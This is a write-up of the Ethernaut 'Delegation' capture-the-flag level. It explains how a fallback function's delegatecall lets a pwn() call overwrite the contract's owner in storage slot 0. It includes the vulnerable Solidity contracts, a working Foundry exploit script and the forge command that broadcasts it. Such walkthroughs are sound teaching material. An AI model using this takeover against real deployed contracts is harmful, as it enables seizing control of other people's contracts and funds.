---
title: 'Delegation - The Ethernaut'
cover: https://ethernaut.openzeppelin.com/imgs/Level6.svg
categories: ["ctf"]
tags: ["blockchain","ethernaut"]
date: 2025-09-17
lastmod: 2025-09-17
---

## Challenge Overview

This level involves two contracts: `Delegate` and `Delegation`. The goal is to claim ownership of the `Delegation` contract by exploiting its use of `delegatecall` in the fallback function. The vulnerability allows an attacker to execute the `pwn()` function from the `Delegate` contract within the storage context of the `Delegation` contract, thereby changing its owner.

---

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result, ) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```

---

## Exploit Explanation

The critical vulnerability lies in the `fallback()` function of the `Delegation` contract:

```solidity
fallback() external {
    (bool result, ) = address(delegate).delegatecall(msg.data);
    if (result) {
        this;
    }
}
```

`delegatecall` is a low-level function that executes code from the target contract (`Delegate`) but uses the storage context of the calling contract (`Delegation`). This means:

1. When we call the `pwn()` function via `delegatecall`, it executes in `Delegation`'s storage context
2. Both contracts have their `owner` variable at the same storage slot (slot 0)
3. The `pwn()` function sets `owner = msg.sender`, which modifies `Delegation`'s owner, not `Delegate`'s owner

The exploit involves:
1. Sending a transaction to the `Delegation` contract with calldata that matches the `pwn()` function signature
2. This triggers the fallback function, which performs a `delegatecall` to the `Delegate` contract
3. The `pwn()` function executes within `Delegation`'s context, changing its owner to our address

---

## Exploit Script

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Delegation.sol";

contract DelegationSolution is Script {
    Delegation public delegationInstance = Delegation(<YOUR_INSTANCE>);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        // Check current owner before attack
        console.log("Owner before attack:", delegationInstance.owner());
        
        // Trigger the fallback function with pwn() function signature
        // This will execute delegatecall to the Delegate contract's pwn() function
        address(delegationInstance).call(
            abi.encodeWithSignature("pwn()")
        );
        
        // Verify the owner has been changed
        console.log("Owner after attack:", delegationInstance.owner());
        console.log("My address:", vm.envAddress("MY_ADDRESS"));
        
        vm.stopBroadcast();
    }
}
```

---

## Proof of Concept (PoC)

Execute the exploit with Foundry:

```bash
forge script script/DelegationSolution.s.sol --rpc-url $SEPOLIA_URL --broadcast
```